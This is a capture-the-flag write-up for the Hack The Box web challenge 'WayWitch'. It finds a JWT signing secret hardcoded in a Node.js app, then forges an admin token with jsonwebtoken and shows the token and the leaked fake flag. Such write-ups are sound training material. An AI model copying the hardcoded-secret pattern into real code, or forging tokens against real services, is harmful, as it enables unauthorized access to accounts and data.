---
title: WayWitch - Hack The Box
date: 2024-12-09
---

# WayWitch

## Challenge description

Hidden in the shadows, a coven of witches communicates through arcane tokens, their messages cloaked in layers of dark
enchantments. These enchanted tokens safeguard their cryptic conversations, masking sinister plots that threaten to
unfold under the veil of night. However, whispers suggest that their protective spells are flawed, allowing outsiders to
forge their own charms. Can you exploit the weaknesses in their mystical seals, craft a token of your own, and 
infiltrate their circle to thwart their nefarious plans before the next moon rises? NOTE: use https:// to connect to the
instance

## Challenge overview

In this challenge, we are presented with a web application that allows unauthenticated users to submit tickets to a
witches' coven.

![WayWitch - Overview](/ctf/hack-the-box/challenges/web/way-witch/overview.png){style="display: block; margin: 0 auto"}

## Code Review

### database.js

The application utilizes a SQLite3 database to store ticket information. The `tickets` table is pre-populated with
several entries, including one from the `admin` user containing the flag:

```javascript
await this.db.exec(`
      INSERT INTO tickets (name, username, content) VALUES
      ('John Doe', 'guest_1234', 'I need help with my account.'),
      ('Jane Smith', 'guest_5678', 'There is an issue with my subscription.'),
      ('Admin', 'admin', 'Top secret: The Halloween party is at the haunted mansion this year. Use this code to enter ${flag}'),
      ('Paul Blake', 'guest_9012', 'Can someone assist with resetting my password?'),
      ('Alice Cooper', 'guest_3456', 'The app crashes every time I try to upload a picture.');
  `);
```

### rootes/index.js

The `/tickets` route displays the contents of the `tickets` table. Access to this route is restricted to users 
authenticated as `admin`:

```js
router.get("/tickets", async (req, res) => {
    const sessionToken = req.cookies.session_token; // [!code focus]

    if (!sessionToken) {
        return res.status(401).json(response("No session token provided"));
    }

    try {
        const username = getUsernameFromToken(sessionToken); // [!code focus]

        if (username === "admin") { // [!code focus]
            try {
                const tickets = await db.get_tickets(); // [!code focus]
                return res.status(200).json({ tickets }); // [!code focus]
            } catch (err) {
                return res
                    .status(500)
                    .json(response("Error fetching tickets: " + err.message));
            }
        } else {
            return res
                .status(403)
                .json(response("Access denied. Admin privileges required."));
        }
    } catch (err) {
        return res.status(400).json(response(err.message));
    }
});
```

This route checks for a `session_token` cookie, extracts the username using the `getUsernameFromToken` function, and
verifies if the user is `admin`. If so, it retrieves and returns the tickets; otherwise, it denies access.

### utils.js

The `getUsernameFromToken` function decodes the session token to extract the username:

```javascript
const jwt = require("jsonwebtoken");

function getUsernameFromToken(token) {
    const secret = "halloween-secret";

    try {
        const decoded = jwt.verify(token, secret);
        return decoded.username;
    } catch (err) {
        throw new Error("Invalid token: " + err.message);
    }
}
```

This function uses the `jsonwebtoken` library to verify and decode the token with the secret key `halloween-secret`. By
crafting a valid token with the username set to `admin`, an attacker can gain unauthorized access to the `/tickets`
route.

## Exploitation

To exploit this vulnerability, we can create a JSON Web Token (JWT) with the payload `{ "username": "admin" }` and sign
it using the secret key `halloween-secret`. This can be achieved using the `jsonwebtoken` library in Node.js:

```javascript
const jwt = require("jsonwebtoken");

console.log(jwt.sign({ username: "admin" }, "halloween-secret"));
```

Running this script will output a JWT:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzMzODY4MzQ3fQ.kmpxqrB-pmEqJf51ASzid27tIYtPRVZALeoriRSByqk
```

By setting this token as the value of the `session_token` cookie in the browser, we can access the `/tickets` route and
retrieve the flag:

```json
{
    "tickets": [
        {
            "id": 1,
            "name": "John Doe",
            "username": "guest_1234",
            "content": "I need help with my account."
        },
        {
            "id": 2,
            "name": "Jane Smith",
            "username": "guest_5678",
            "content": "There is an issue with my subscription."
        },
        { // [!code focus]
            "id": 3, // [!code focus]
            "name": "Admin", // [!code focus]
            "username": "admin", // [!code focus]
            "content": "Top secret: The Halloween party is at the haunted mansion this year. Use this code to enter HTB{f4k3_fl4g_f0r_t35t1ng}\n" // [!code focus]
        }, // [!code focus]
        {
            "id": 4,
            "name": "Paul Blake",
            "username": "guest_9012",
            "content": "Can someone assist with resetting my password?"
        },
        {
            "id": 5,
            "name": "Alice Cooper",
            "username": "guest_3456",
            "content": "The app crashes every time I try to upload a picture."
        }
    ]
}
```

The flag is in the content of the ticket created by the `admin` user:

```
Top secret: The Halloween party is at the haunted mansion this year. Use this code to enter HTB{f4k3_fl4g_f0r_t35t1ng}
```

With the fake flag retrieved, we can use the same technique to get the real flag on the HTB server.

![WayWitch - pwned](/ctf/hack-the-box/challenges/web/way-witch/pwned.png)

## References

- [jsonwebtoken](https://www.npmjs.com/package/jsonwebtoken)
